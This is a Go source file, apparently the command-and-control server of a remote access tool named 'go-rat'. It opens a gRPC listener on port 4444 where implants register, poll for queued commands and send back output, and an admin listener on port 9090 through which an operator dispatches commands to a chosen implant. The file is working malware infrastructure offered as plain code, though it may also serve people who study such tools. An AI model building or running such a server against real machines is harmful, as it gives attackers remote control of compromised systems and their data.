package main

import (
	"context"
	"errors"
	"github.com/google/uuid"
	"github.com/iortego42/go-rat/grpcapi"
	"github.com/iortego42/go-rat/log"
	"google.golang.org/grpc"
	"net"
)

type session struct {
	in  chan *grpcapi.Command
	out chan *grpcapi.Command
}

type implantServer struct {
	//implants map[uuid.UUID]session
	grpcapi.ImplantServer
}

type adminServer struct {
	//work, output chan *grpcapi.Command
	grpcapi.AdminServer
}

var logger = log.InitLogger()
var implants map[uuid.UUID]*session = make(map[uuid.UUID]*session)

func newImplantServer() *implantServer {
	s := new(implantServer)
	//s.work = work
	//s.output = output
	return s
}

func newAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	//s.work = work
	//s.output = output
	return s
}

func (s *implantServer) RegisterImplant(ctx context.Context, identity *grpcapi.Identity) (*grpcapi.Identity, error) {
	if identity != nil && len(identity.Id) > 0 && implants[uuid.MustParse(identity.Id)] != nil {
		logger.Debug("Connected", "UUID", identity.Id)
		return identity, nil
	}
	id := uuid.New()
	identity.Id = id.String()
	implants[id] = &session{make(chan *grpcapi.Command), make(chan *grpcapi.Command)}
	logger.Debug("New Implant", "UUID", identity.Id)
	return identity, nil
}

func (s *implantServer) FetchCommand(ctx context.Context, identity *grpcapi.Identity) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)

	select {
	case cmd, ok := <-implants[uuid.MustParse(identity.Id)].in:
		logger.Debug("Comando recibido.", "CMD", cmd.In, "Implant", identity.Name)
		if ok {
			cmd.Id = identity.Id
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	implants[uuid.MustParse(result.Id)].out <- result
	logger.Debug("Resultado enviado al administrador.")
	return &grpcapi.Empty{}, nil
}

func (s *adminServer) RunCommand(ctx context.Context, command *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	var id = uuid.MustParse(command.Id)
	go func() {
		implants[id].in <- command
	}()
	logger.Debug("Enviado comando al Servidor.", "CMD", command.In)
	res = <-implants[id].out
	logger.Debug("Resultado recibido.")
	return res, nil
}

func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *grpcapi.Command
	)
	logger.SetLevel(log.DebugLevel)
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := newImplantServer()
	admin := newAdminServer(work, output)
	clientAddr := ":9090"
	implantAddr := ":4444"
	if implantListener, err = net.Listen("tcp", implantAddr); err != nil {
		logger.Debug(implantListener)
		logger.Fatal("Error en el listener del implant", "ERROR", err)
	}

	if adminListener, err = net.Listen("tcp", clientAddr); err != nil {
		logger.Debug(adminListener)
		logger.Fatal("Error en el listener del admin", "ERROR", err)
	}

	if adminListener == nil || implantListener == nil {
		logger.Fatal("No se puede escuchar.", "ERROR", "Los listeners son nil!!!")
	}

	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	if grpcAdminServer == nil || admin == nil {
		logger.Fatal("grpcAdmin server es nulo")
	}
	if grpcImplantServer == nil || implant == nil {
		logger.Fatal("grpcAdmin server es nulo")
	}
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	go func() {
		logger.Infof("ImplantListener escuchando en %s", implantAddr)
		err = grpcImplantServer.Serve(implantListener)
		if err != nil {
			logger.Fatal(err)
		}
	}()
	logger.Infof("AdminListener escuchando en %s", clientAddr)
	err = grpcAdminServer.Serve(adminListener)
	if err != nil {
		logger.Fatal(err)
	}
}
